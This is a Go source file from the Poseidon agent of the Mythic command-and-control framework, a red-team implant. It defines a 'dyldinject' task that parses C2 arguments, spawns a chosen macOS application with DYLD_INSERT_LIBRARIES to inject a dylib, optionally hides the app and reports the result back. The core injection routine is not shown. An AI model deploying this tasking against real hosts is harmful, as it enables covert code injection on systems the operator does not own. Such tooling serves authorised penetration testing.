package dyldinject

import (
	// Standard
	"encoding/json"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type Arguments struct {
	Application string `json:"application"`
	Dylibpath   string `json:"dylibpath"`
	HideApp     bool   `json:"hideApp"`
}

func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID

	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)

	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}

	r, err := runCommand(args.Application, args.Dylibpath, args.HideApp)
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}

	if r.Successful {
		msg.UserOutput = "successfully spawned application with DYLD_INSERT_LIBRARIES"
		msg.Completed = true
		task.Job.SendResponses <- msg
	} else {
		msg.UserOutput = "failed to spawn application"
		msg.Completed = true
		task.Job.SendResponses <- msg
	}

	return
}
